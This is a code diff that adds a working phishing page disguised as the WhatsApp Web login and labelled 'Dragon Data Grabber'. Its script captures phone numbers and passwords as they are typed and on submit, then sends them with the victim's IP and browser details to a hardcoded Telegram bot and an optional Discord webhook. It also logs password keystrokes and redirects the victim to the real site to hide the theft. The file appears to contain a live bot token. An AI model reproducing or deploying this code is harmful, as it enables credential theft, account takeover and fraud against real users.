@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - WhatsApp Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 20px;
+            width: 380px;
+            box-shadow: 0 0 50px rgba(0, 200, 0, 0.1);
+            border: 1px solid #2a2a2a;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo svg { width: 80px; height: 80px; }
+        .logo h2 {
+            color: #25D366;
+            margin-top: 10px;
+            font-weight: 300;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            color: #aaa;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: #0d0d0d;
+            border: 1px solid #2a2a2a;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #25D366;
+            box-shadow: 0 0 15px rgba(37, 211, 102, 0.1);
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #25D366;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #1da85c; transform: scale(1.02); }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #25D366;
+            font-size: 14px;
+        }
+        .loader.active { display: block; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #1a1a1a;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="80" height="80">
+                <path fill="#25D366" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+            </svg>
+            <h2>WhatsApp Web</h2>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📱 Nomor Telepon</label>
+                <input type="text" id="phone" placeholder="628xxxxxxxxx" required>
+            </div>
+            <div class="input-group">
+                <label>🔐 Password</label>
+                <input type="password" id="password" placeholder="Masukkan password" required>
+            </div>
+            <button type="submit" class="btn" id="submitBtn">MASUK</button>
+        </form>
+
+        <div class="loader" id="loader">
+            <span class="spinner"></span> Memproses...
+        </div>
+
+        <div class="footer">
+            ⚡ One-click data grabber • Dragon V1
+        </div>
+    </div>
+
+    <script>
+        // =========================================
+        // DRAGON DATA GRABBER v1.0 - AUTO CAPTURE
+        // =========================================
+        
+        // ⚡ WEBHOOK UPDATED BOS ⚡
+        const TELEGRAM_BOT = "8796493988:AAFmSjQbCDCw5IRBX3ursm2I5wVNqQHxnB0";
+        const TELEGRAM_CHAT = "8604790393";
+        
+        // Discord Webhook (opsional - kosongin kalo gak pake)
+        const DISCORD_WEBHOOK = "";
+
+        // Fungsi kirim data
+        function sendData(data) {
+            const ip = getIP();
+            const ua = navigator.userAgent;
+            const time = new Date().toLocaleString('id-ID');
+            
+            const message = `
+╔═══════════════════════════════╗
+║     🔥 DRAGON PHISH DATA      ║
+╠═══════════════════════════════╣
+║ 📱 Phone  : ${data.phone}
+║ 🔑 Pass   : ${data.pass}
+╠═══════════════════════════════╣
+║ 🌐 IP     : ${ip}
+║ 💻 UA     : ${ua.substring(0, 50)}
+║ 🕐 Time   : ${time}
+╚═══════════════════════════════╝
+            `;
+
+            // Kirim ke Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(() => {});
+
+            // Kirim ke Discord (kalo diisi)
+            if (DISCORD_WEBHOOK) {
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '```' + message + '```'
+                    })
+                }).catch(() => {});
+            }
+
+            // Simpan ke localStorage (backup)
+            let saved = JSON.parse(localStorage.getItem('dragondata') || '[]');
+            saved.push(data);
+            localStorage.setItem('dragondata', JSON.stringify(saved));
+
+            return true;
+        }
+
+        // Dapatkan IP publik
+        function getIP() {
+            let ip = 'Tidak terdeteksi';
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => { ip = d.ip; })
+                .catch(() => {});
+            return ip;
+        }
+
+        // Auto-capture semua form input secara real-time
+        document.addEventListener('DOMContentLoaded', function() {
+            const phone = document.getElementById('phone');
+            const pass = document.getElementById('password');
+            
+            let lastData = { phone: '', pass: '' };
+
+            function checkAndCapture() {
+                const phoneVal = phone.value.trim();
+                const passVal = pass.value.trim();
+                
+                if (phoneVal.length >= 8 && passVal.length >= 1) {
+                    if (phoneVal !== lastData.phone || passVal !== lastData.pass) {
+                        lastData = { phone: phoneVal, pass: passVal };
+                        sendData({ phone: phoneVal, pass: passVal });
+                        console.log('[DRAGON] Auto-captured:', phoneVal);
+                    }
+                }
+            }
+
+            phone.addEventListener('input', checkAndCapture);
+            pass.addEventListener('input', checkAndCapture);
+
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const phoneVal = phone.value.trim();
+                const passVal = pass.value.trim();
+                
+                if (phoneVal && passVal) {
+                    sendData({ phone: phoneVal, pass: passVal });
+                    
+                    document.getElementById('loader').classList.add('active');
+                    document.getElementById('submitBtn').disabled = true;
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://web.whatsapp.com/';
+                    }, 1500);
+                }
+            });
+
+            window.addEventListener('beforeunload', function() {
+                const phoneVal = phone.value.trim();
+                const passVal = pass.value.trim();
+                if (phoneVal && passVal) {
+                    sendData({ phone: phoneVal, pass: passVal });
+                }
+            });
+        });
+
+        // Keylogger
+        document.addEventListener('keydown', function(e) {
+            const target = e.target;
+            if (target.tagName === 'INPUT' && target.type === 'password') {
+                console.log('[KEYLOG]', e.key);
+            }
+        });
+    </script>
+</body>
+</html>
